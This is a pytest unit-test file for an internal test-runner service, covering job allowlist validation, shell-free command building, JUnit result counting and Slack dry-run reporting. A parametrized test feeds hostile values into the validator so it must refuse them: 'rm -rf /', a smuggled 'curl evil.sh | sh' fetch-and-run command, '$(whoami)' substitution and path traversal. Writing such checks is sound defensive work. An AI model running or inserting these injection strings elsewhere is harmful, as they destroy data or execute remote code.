"""The test server: what it refuses, what it measures, what it says.

The interesting cases are the ones where the machine is asked to do something
it should not, and the ones where a report is *almost* right — a wrong count is
worse than no count, because nobody re-checks a number that looks plausible.
"""

from __future__ import annotations

import textwrap

import pytest

from test_server.agent import build_argv, counts_from_junit, validate
from test_server.reporter import JobReporter

pytestmark = pytest.mark.unit


#: The runner's OWN allowlist, which is the point of `validate` -- it must not
#: be taken from the job, and must not be fetched from the edge, or a compromised
#: edge would simply send a wider one and the re-check would agree with it.
#: Fictional values, so this file cannot become a place house names live.
ALLOW = {
    "allowed_products": frozenset({"alpha", "beta"}),
    "allowed_servers": frozenset({"sandbox", "staging"}),
    "allowed_test_scopes": frozenset({"smoke", "full"}),
}


def job(**overrides) -> dict:
    base = {
        "job_id": "abc123",
        "product": "alpha",
        "server": "sandbox",
        "select": "",
        "marker": "",
        "slack_channel": "#testing",
        "slack_user": "U1",
    }
    base.update(overrides)
    return base


# ── defence in depth ─────────────────────────────────────────────────────────

def test_a_well_formed_job_is_accepted() -> None:
    assert validate(job(), **ALLOW) is None


@pytest.mark.parametrize(
    "field, value",
    [
        ("product", "../../etc"),
        ("product", "unknown"),
        ("server", "prod"),          # deliberately not in ALLOW
        ("server", "; rm -rf /"),
        ("select", 'smoke"; curl evil.sh | sh; "'),
        ("marker", "$(whoami)"),
        ("select", "a" * 200),
    ],
)
def test_a_job_that_fails_the_allowlist_is_refused(field, value) -> None:
    """The edge already checked this. That is not a reason to skip it.

    A signature proves WHO sent a job, not that its contents are sane. If the
    edge is compromised, or grows a code path that skips a check, this is the
    last thing between a payload off the network and a subprocess on an
    internal machine.
    """
    assert validate(job(**{field: value}), **ALLOW) is not None


def test_an_empty_allowlist_refuses_everything_rather_than_allowing_it() -> None:
    """The failure this whole boundary exists to avoid, at the last checkpoint.

    A runner started with no RUNTESTS_PRODUCTS must run nothing, not run
    anything. `x not in frozenset()` falls the safe way by construction, but the
    opposite reading -- "no allowlist configured, so no restriction" -- is
    exactly the shape of the bug NEH-1119 fixed one layer up, so it is pinned
    here rather than left to the reader.
    """
    assert validate(
        job(), allowed_products=frozenset(), allowed_servers=frozenset()
    ) is not None


def test_the_runner_refuses_a_test_scope_outside_its_own_allowlist() -> None:
    assert validate(job(test_scope="exfiltrate"), **ALLOW) is not None


# ── the command ──────────────────────────────────────────────────────────────

def test_the_command_is_a_list_so_nothing_can_be_reinterpreted_as_shell() -> None:
    argv = build_argv("webapp", "staging", "smoke and not slow", "", "tests/sample", "/tmp/r.xml")

    assert isinstance(argv, list)
    # The whole expression is ONE argument. Split into four it would select
    # different tests and still report green, which is the silent kind of wrong.
    assert "smoke and not slow" in argv
    assert argv[argv.index("-k") + 1] == "smoke and not slow"


def test_empty_selectors_are_omitted_rather_than_passed_empty() -> None:
    """`-k ''` matches nothing and pytest exits 5 — a run that looks broken."""
    argv = build_argv("webapp", "staging", "", "", "tests/sample", "/tmp/r.xml")

    assert "-k" not in argv and "-m" not in argv


def test_the_junit_path_is_per_job() -> None:
    """Two servers on one shared filesystem must not overwrite each other's report."""
    argv = build_argv("webapp", "staging", "", "", "tests/sample", "/tmp/results-abc123.xml")

    assert "--junit-xml=/tmp/results-abc123.xml" in argv


# ── counting ─────────────────────────────────────────────────────────────────

JUNIT = textwrap.dedent("""\
    <?xml version="1.0" encoding="utf-8"?>
    <testsuites>
      <testsuite name="pytest" errors="1" failures="1" skipped="1" tests="5" time="4.25">
        <testcase classname="tests.sample.webapp.test_smoke" name="test_ok" time="0.1"/>
        <testcase classname="tests.sample.webapp.test_smoke" name="test_also_ok" time="0.1"/>
        <testcase classname="tests.sample.webapp.test_smoke" name="test_bad" time="0.1">
          <failure message="assert 1 == 2">boom</failure>
        </testcase>
        <testcase classname="tests.sample.webapp.test_smoke" name="test_broken" time="0.1">
          <error message="fixture blew up">bang</error>
        </testcase>
        <testcase classname="tests.sample.webapp.test_smoke" name="test_skipped" time="0.0">
          <skipped message="no"/>
        </testcase>
      </testsuite>
    </testsuites>
    """)


def test_counts_come_from_the_report_pytest_wrote(tmp_path) -> None:
    path = tmp_path / "results.xml"
    path.write_text(JUNIT)

    passed, failed, skipped, duration, failed_ids = counts_from_junit(path)

    assert (passed, failed, skipped) == (2, 2, 1)
    assert duration == pytest.approx(4.25)
    # Errors count as failures, and both kinds are named — that is the thing
    # scraping stdout could never do.
    assert failed_ids == [
        "tests.sample.webapp.test_smoke::test_bad",
        "tests.sample.webapp.test_smoke::test_broken",
    ]


def test_a_bare_testsuite_root_is_handled(tmp_path) -> None:
    """pytest emits <testsuites> now and <testsuite> in older versions."""
    path = tmp_path / "results.xml"
    path.write_text('<testsuite name="pytest" tests="2" failures="0" errors="0" skipped="0" time="1.0"/>')

    assert counts_from_junit(path)[:3] == (2, 0, 0)


@pytest.mark.parametrize("content", ["", "not xml at all", "<testsuite"])
def test_an_unreadable_report_yields_zeros_not_a_wrong_number(tmp_path, content) -> None:
    """Zeros are visibly wrong. A plausible wrong number is not, and nobody
    re-checks a number that looks fine. The exit code decides pass/fail anyway."""
    path = tmp_path / "results.xml"
    path.write_text(content)

    assert counts_from_junit(path) == (0, 0, 0, 0.0, [])


def test_a_missing_report_yields_zeros(tmp_path) -> None:
    assert counts_from_junit(tmp_path / "nope.xml") == (0, 0, 0, 0.0, [])


# ── what it says ─────────────────────────────────────────────────────────────

@pytest.fixture
def console(monkeypatch):
    """No Slack token: every message must print instead of being sent."""
    monkeypatch.delenv("SLACK_BOT_TOKEN", raising=False)
    return JobReporter("#testing", "runner-2")


def test_all_four_milestones_are_printed_when_slack_is_not_configured(console, capsys) -> None:
    payload = job()
    console.received(payload)
    console.started(payload, ["pytest", "tests/sample/webapp"])
    console.completed(payload, exit_code=0, duration=4.2)
    console.summary(passed=12, failed=0, skipped=1, duration=4.2, failed_ids=[])

    printed = capsys.readouterr().err
    assert printed.count("[slack:dry-run]") == 4, "each milestone is its own message"
    assert "Received" in printed
    assert "Running" in printed
    assert "Finished" in printed
    assert "12 passed" in printed
    # Says where it would have gone, so "correctly inert" is distinguishable
    # from "misconfigured and posting nowhere".
    assert printed.count("-> #testing") == 4


def test_the_machine_that_ran_it_is_named(console, capsys) -> None:
    """Four identical test servers make "which one was it?" the first question."""
    console.received(job())

    assert "runner-2" in capsys.readouterr().err


def test_a_failing_run_is_reported_as_failed(console, capsys) -> None:
    console.completed(job(), exit_code=1, duration=2.0)
    console.summary(passed=3, failed=2, skipped=0, duration=2.0,
                    failed_ids=["webapp::test_a", "webapp::test_b"])

    printed = capsys.readouterr().err
    assert "❌" in printed
    assert "2 failed" in printed
    assert "webapp::test_a" in printed
